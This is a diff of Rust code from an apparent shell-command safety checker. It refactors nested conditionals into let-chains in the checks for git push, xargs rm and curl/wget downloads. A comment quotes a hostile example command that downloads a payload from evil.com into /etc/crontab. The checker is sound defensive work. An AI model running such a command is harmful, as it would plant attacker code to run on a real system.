@@ -825,18 +825,18 @@ fn analyze_single_segment(
     }
 
     // Check for git push/force operations
-    if let Some(start) = primary_token_index(argv) {
-        if tokens_start_with(argv, start, "git push") {
-            let force = argv[start..].iter().any(|t| t == "--force" || t == "-f");
-            return SafetyAnalysis::requires_approval(
-                command,
-                vec![if force {
-                    "Force push can overwrite remote history".to_string()
-                } else {
-                    "Push will modify remote repository".to_string()
-                }],
-            );
-        }
+    if let Some(start) = primary_token_index(argv)
+        && tokens_start_with(argv, start, "git push")
+    {
+        let force = argv[start..].iter().any(|t| t == "--force" || t == "-f");
+        return SafetyAnalysis::requires_approval(
+            command,
+            vec![if force {
+                "Force push can overwrite remote history".to_string()
+            } else {
+                "Push will modify remote repository".to_string()
+            }],
+        );
     }
 
     // Default: requires approval for unknown commands
@@ -905,30 +905,28 @@ fn analyze_destructive_patterns(
                 // `xargs rm …` runs `rm` over piped input — its targets go
                 // through the same deletion checks.
                 let rest = &segment.argv[start + 1..];
-                if let Some(pos) = rest.iter().position(|t| t == "rm") {
-                    if let Some(reason) = dangerous_rm_reason(&rest[pos + 1..]) {
-                        return Some(SafetyAnalysis::dangerous(
-                            command,
-                            vec![reason],
-                            vec!["Review the deletion target before retrying".to_string()],
-                        ));
-                    }
+                if let Some(pos) = rest.iter().position(|t| t == "rm")
+                    && let Some(reason) = dangerous_rm_reason(&rest[pos + 1..])
+                {
+                    return Some(SafetyAnalysis::dangerous(
+                        command,
+                        vec![reason],
+                        vec!["Review the deletion target before retrying".to_string()],
+                    ));
                 }
             }
             "curl" | "wget" => {
                 // `-o/--output <path>` with a sensitive destination is file
                 // overwrite riding on a download flag (article 16: `curl -o
                 // /etc/crontab http://evil.com/payload`).
-                if let Some(target) = download_output_target(&segment.argv[start + 1..]) {
-                    if redirect_target_outside_workspace(&target) {
-                        return Some(SafetyAnalysis::dangerous(
-                            command,
-                            vec![
-                                "Download output targets a path outside the workspace".to_string(),
-                            ],
-                            vec!["Download to a relative path inside the workspace".to_string()],
-                        ));
-                    }
+                if let Some(target) = download_output_target(&segment.argv[start + 1..])
+                    && redirect_target_outside_workspace(&target)
+                {
+                    return Some(SafetyAnalysis::dangerous(
+                        command,
+                        vec!["Download output targets a path outside the workspace".to_string()],
+                        vec!["Download to a relative path inside the workspace".to_string()],
+                    ));
                 }
             }
             "find" => {
@@ -1248,8 +1246,8 @@ fn analyze_find_mutation(command: &str, args: &[String]) -> Option<SafetyAnalysi
 /// (`-oFILE`) and `--output=FILE` forms. `None` when the command writes to
 /// its default location (cwd/remote filename) or has no output flag.
 fn download_output_target(args: &[String]) -> Option<String> {
-    let mut iter = args.iter().enumerate();
-    while let Some((idx, arg)) = iter.next() {
+    let iter = args.iter().enumerate();
+    for (idx, arg) in iter {
         let target = if let Some(value) = arg.strip_prefix("--output=") {
             Some(value.to_string())
         } else if arg == "--output" || arg == "--output-document" || arg == "-o" || arg == "-O" {
@@ -1259,10 +1257,10 @@ fn download_output_target(args: &[String]) -> Option<String> {
         } else {
             None
         };
-        if let Some(target) = target {
-            if !target.starts_with('-') {
-                return Some(target);
-            }
+        if let Some(target) = target
+            && !target.starts_with('-')
+        {
+            return Some(target);
         }
     }
     None
